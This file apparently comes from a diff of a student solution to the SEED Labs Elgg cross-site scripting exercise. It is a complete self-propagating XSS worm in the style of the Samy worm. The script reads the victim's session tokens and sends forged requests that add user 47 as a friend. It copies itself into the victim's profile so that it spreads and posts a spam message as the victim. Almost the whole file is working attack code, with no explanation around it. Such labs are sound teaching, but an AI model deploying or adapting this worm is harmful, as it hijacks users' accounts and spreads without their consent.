@@ -1,0 +1,64 @@
+<script id="worm">
+
+	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+
+	var jsCode = document.getElementById("worm").innerHTML;
+
+	var tailTag = "</" + "script>";
+
+	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+	
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+	//Construct the HTTP request to add Samy as a friend.
+	
+	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token; //FILL IN
+	if(elgg.session.user.guid!=47){
+		//Create and send Ajax request to add friend
+		var Ajax=null;
+		Ajax=new XMLHttpRequest();
+		Ajax.open("GET",sendurl,true);
+		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+		Ajax.send();
+		}
+	var token1="__elgg_token="+elgg.security.token.__elgg_token;
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var sendurl1="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
+
+	var content1=token1+ts+"&name="+elgg.session.user.name+"&description="+wormCode+"&accesslevel[description]=1&briefdescription=Samy is great&accesslevel[briefdescription]=1&location=abcd&accesslevel[location]=1&interests=abcd&accesslevel[interests]=1&skills=abcd&accesslevel[skills]=1&contactemail=abc@d.com&accesslevel[contactemail]=1&phone=1234&accesslevel[phone]=1&mobile=1234&accesslevel[mobile]=1&website=http://www.ab.com&accesslevel[website]=1&twitter=abcd&accesslevel[twitter]=1&guid="+elgg.session.user.guid; //FILL IN
+	
+	if(elgg.session.user.guid!=47)
+	{
+		//Create and send Ajax request to modify profile
+		var Ajax1=null;
+		Ajax1=new XMLHttpRequest();
+		Ajax1.open("POST",sendurl1,true);
+		Ajax1.setRequestHeader("Host","www.xsslabelgg.com");
+		Ajax1.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax1.send(content1);
+	}
+	
+	//Construct the content of your url.
+        var sendurl2="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
+	//__elgg_token=NpQjOYY6Al9XSKbx8CpYOQ&__elgg_ts=1624172742&body=I+am
+	var profile=encodeURIComponent("http://www.xsslabelgg.com/profile/"+elgg.session.user.name);
+	var url=decodeURIComponent(profile);
+	var content2=token1+ts+"&body=To earn 12 USD/Hour(!), visit now "+url; //FILL IN
+	
+	if(elgg.session.user.guid!=47)
+	{
+		//Create and send Ajax request to post on behalf of victim
+		var Ajax2=null;
+		Ajax2=new XMLHttpRequest();
+		Ajax2.open("POST",sendurl2,true);
+		Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
+		Ajax2.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax2.send(content2);
+	}
+
+	//alert(jsCode);
+
+</script>
